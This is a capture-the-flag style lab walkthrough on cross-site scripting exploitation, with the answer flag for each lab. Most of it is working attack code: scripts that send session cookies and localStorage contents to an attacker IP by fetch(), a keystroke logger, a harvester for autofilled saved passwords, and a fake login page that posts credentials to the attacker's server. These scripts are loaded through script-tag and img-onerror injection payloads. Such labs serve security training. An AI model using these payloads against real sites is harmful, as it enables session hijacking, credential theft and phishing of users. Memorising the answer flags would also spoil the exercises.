# **Cross-Site Scripting - Exploitation**

#### **Stealing Session Cookies**
#### **Lab 1.** Steal the session cookie using the "Use Non-HttpOnly Cookie" setting from the Donate application using the techniques taught here. The flag is in the format OS{...} without any spaces.

Answer - OS{c506a15c451370f390df8bee42cb6963}

- Create a xss.js file on kali machine and host it.
```
let  cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://192.168.45.174:80/exfil?data="+encodedCookie)
```
- Start the HTTP server.
```
python3 -m http.server 80
```

![sesion_cookie_img1](images/sesion_cookie_img1.png)   

- Go to Donate application. Check Use Non-HttpOnly Cookie.

- In url, enter below payload for the name parameter.
```
<script src="http://192.168.45.174/xss.js"></script>
```

![sesion_cookie_img2](images/sesion_cookie_img2.png)  

- Now press render, check the HTTP server logs. You can see the flag which you need to decode as URL.

![sesion_cookie_img3](images/sesion_cookie_img3.png)  

![sesion_cookie_img4](images/sesion_cookie_img4.png)  


#### **Lab 2.** Steal the session cookie using the "Use Non-HttpOnly Cookie" setting from the RSVP application using the techniques taught here.

Answer - OS{61eef285ddb9ee6ac77f8f21510fa83d}

![sesion_cookie_lab2_img1](images/sesion_cookie_lab2_img1.png)  

![sesion_cookie_lab2_img2](images/sesion_cookie_lab2_img2.png)  

![sesion_cookie_lab2_img3](images/sesion_cookie_lab2_img3.png)  

![sesion_cookie_lab2_img4](images/sesion_cookie_lab2_img4.png)  


#### **Lab 3.** Steal the session cookie using the "Use Non-HttpOnly Cookie" setting from the List application using the techniques taught here.

Answer - OS{98256e4b119800c9ed4a67a899f32538}

- Payload
```
<img src="x" onerror="var s=document.createElement('script'); s.src='http://192.168.45.174/xss.js'; document.head.appendChild(s);">
```

- Now just append the payload to any name.

![sesion_cookie_lab3_img1](images/sesion_cookie_lab3_img1.png)

- Click on share.

![sesion_cookie_lab3_img2](images/sesion_cookie_lab3_img2.png)

- Now paste the copied test in the url ,click on go and then render button.

![sesion_cookie_lab3_img3](images/sesion_cookie_lab3_img3.png)

- Check the HTTP server logs. You can see the flag which you need to decode as URL.

![sesion_cookie_lab3_img4](images/sesion_cookie_lab3_img4.png)  

![sesion_cookie_lab3_img5](images/sesion_cookie_lab3_img5.png) 


#### **Lab 4.** Steal the session cookie using the "Use Non-HttpOnly Cookie" setting from the ToDo application using the techniques taught here.

Answer - OS{58256e4b119800c9ed4a67a899f32538}

- Add below payload to add a new Task in TODO application.

```
Test XSS<script src="http://192.168.45.174/xss.js"></script>
```
- Click on render.

![sesion_cookie_lab4_img1](images/sesion_cookie_lab4_img1.png)

- Check the hTTP server logs. You can see the flag which you need to decode as URL.

![sesion_cookie_lab4_img2](images/sesion_cookie_lab4_img2.png)

![sesion_cookie_lab4_img3](images/sesion_cookie_lab4_img3.png)


#### **Stealing Local Secrets**
#### **Lab 1.** Steal the local storage contents using the "Data in Local Storage" setting from the Donate application using the techniques taught here.

Answer - OS{c5d0e39f1077197d81f889bd22c09f42}

- Create a xss_local_storage.js file on kali machine and host it.
```
let data = JSON.stringify(localStorage)
let encodedData = encodeURIComponent(data)
fetch("http://192.168.45.174/exfil?data="+encodedData)
```
- Start the HTTP server.
```
python3 -m http.server 80
```

![local_secret_img1](images/local_secret_img1.png)   

- Go to Donate application. Check Data in local storage.

- In url, enter below payload for the name parameter.
```
<script src="http://192.168.45.174/xss_local_storage.js"></script>
```

![local_secret_img2](images/local_secret_img2.png)  

- Now press render, check the HTTP server logs. You can see the flag which you need to decode as URL.

![local_secret_img3](images/local_secret_img3.png)  

![local_secret_img4](images/local_secret_img4.png)  


#### **Lab 2.** Steal the session cookie using the "Use Non-HttpOnly Cookie" setting from the RSVP application using the techniques taught here.

Answer - OS{e5eaa331805d532c12a0477b4d8d9eea}

Payload:
```
<script src="http://192.168.45.174/xss_local_storage.js"></script>
```

![local_secret_lab2_img1](images/local_secret_lab2_img1.png)  

![local_secret_lab2_img2](images/local_secret_lab2_img2.png)  

![local_secret_lab2_img3](images/local_secret_lab2_img3.png)  


#### **Lab 3.** Steal the local storage contents using the "Data in Local Storage" setting from the List application using the techniques taught here.

Answer - OS{a5014a1243addd902fe8da8f7c582811}

- Payload
```
<img src="x" onerror="var s=document.createElement('script'); s.src='http://192.168.45.174/xss_local_storage.js'; document.head.appendChild(s);">
```

- Now just append the payload to any name.

![local_secret_lab3_img1](images/local_secret_lab3_img1.png)

- Click on share.

![local_secret_lab3_img2](images/local_secret_lab3_img2.png)

- Now paste the copied test in the url ,click on go and then render button.

![local_secret_lab3_img3](images/local_secret_lab3_img3.png)

- Check the HTTP server logs. You can see the flag which you need to decode as URL.

![local_secret_lab3_img4](images/local_secret_lab3_img4.png)  

![local_secret_lab3_img5](images/local_secret_lab3_img5.png) 


#### **Lab 4.** Steal the local storage contents using the "Data in Local Storage" setting from the ToDo application using the techniques taught here.

Answer - OS{0f247ca358e49b01f2055fdf7acc5b6a}

- Add below payload to add a new Task in TODO application.

```
Test XSS<script src="http://192.168.45.174/xss_local_storage.js"></script>
```
- Click on render.

![local_secret_lab4_img1](images/local_secret_lab4_img1.png)

- Check the hTTP server logs. You can see the flag which you need to decode as URL.

![local_secret_lab4_img2](images/local_secret_lab4_img2.png)

![local_secret_lab4_img3](images/local_secret_lab4_img3.png)


#### **Keylogging**
#### **Lab 1.** Key log the user on the Donate application with the "Simulate key strokes" setting checked. The flag is in the format OS{...} without spaces.

Answer - OS{ad1feb830989f5c715f94deb1c09dbbf}

- Host below payload in a xss_keylogging.js file.
```
function logKey(event){
        fetch("http://192.168.45.174/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

```

- Start the HTTP server.
```
python3 -m http.server 80
```

![keylogging_img1](images/keylogging_img1.png)


- Go to Donate application. Check Simulate Keystrokes.

- In url, enter below payload for the name parameter.
```
<script src="http://192.168.45.174/xss_keylogging.js"></script>
```

![keylogging_img2](images/keylogging_img2.png)  

- Now press render, check the HTTP server logs. You can see the flag in logs.

![keylogging_img3](images/keylogging_img3.png)  

![keylogging_img4](images/keylogging_img4.png)  

#### **Stealing Saved Passwords**
#### **Lab 1.** Steal the saved password from the RSVP application using the "Use stored password" setting and the techniques taught here.

Answer - OS{ShavedHeadsFTW}

- Host below payload in a xss_steal_saved_password.js file.
```
let body = document.getElementsByTagName("body")[0]
// Create username input
var usernameInput = document.createElement('input');
usernameInput.type = 'text';
usernameInput.className = 'form-control';
usernameInput.id = 'signin_userName';
usernameInput.name = 'signin_userName';

// Create password input
var passwordInput = document.createElement('input');
passwordInput.type = 'password';
passwordInput.className = 'form-control';
passwordInput.id = 'signin_password';
passwordInput.name = 'signin_password';

// Append to a container (e.g., body or a specific div)
body.append(usernameInput)
body.append(passwordInput)

setTimeout(function(){ 
  fetch("http://192.168.45.174:80/k?username=" + usernameInput.value + "&password=" + passwordInput.value)
}, 5000);
```

- Start the HTTP server.
```
python3 -m http.server 80
```

![stealing_saved_password_img1](images/stealing_saved_password_img1.png)


- Go to RSVP application. Check Use stored password.

- Enter below payload for the no of guest parameter.
```
<script src="http://192.168.45.174/xss_steal_saved_password.js"></script>
```

![stealing_saved_password_img2](images/stealing_saved_password_img2.png)  

- Click submit, Now press render, check the HTTP server logs. You can see the flag in logs.

![stealing_saved_password_img3](images/stealing_saved_password_img3.png)  

![stealing_saved_password_img4](images/stealing_saved_password_img4.png)  


#### **Phishing Users**
#### **Lab 1.** Phish the user on the List application using the "Blindly enter credentials" setting and the techniques taught here. A login page doesn't exist on the List application, so a custom one will need to be created. Submit the password in the format OS{...} as the answer.

Answer - OS{j0hnnydonthax}

- Host below payload in a xss_phishing_login_form.js file.
```
document.getElementsByTagName("html")[0].innerHTML = `
  <html>
    <body>
      <h2>Please log in</h2>
      <form action="http://192.168.45.174:80" method="GET">
        <label>Username: <input type="text" name="username" /></label><br/>
        <label>Password: <input type="password" name="password" /></label><br/>
        <input type="submit" value="Login" />
      </form>
    </body>
  </html>
`;
```

- Start the HTTP server.
```
python3 -m http.server 80
```

![phishing_users_img1](images/phishing_users_img1.png)


- Go to List application. Check Blindly enter credentials.

- Now just append the payload to any name.
```
<img src="x" onerror="var s=document.createElement('script'); s.src='http://192.168.45.174/xss_phishing_login_form.js'; document.head.appendChild(s);">
```

![phishing_users_img2](images/phishing_users_img2.png)

- Click on share.

![phishing_users_img3](images/phishing_users_img3.png)

- Now paste the copied test in the url ,click on go and then render button.

![phishing_users_img4](images/phishing_users_img4.png)

- Check the HTTP server logs. You can see the flag which you need to decode as URL.

![phishing_users_img5](images/phishing_users_img5.png)  

![phishing_users_img6](images/phishing_users_img6.png) 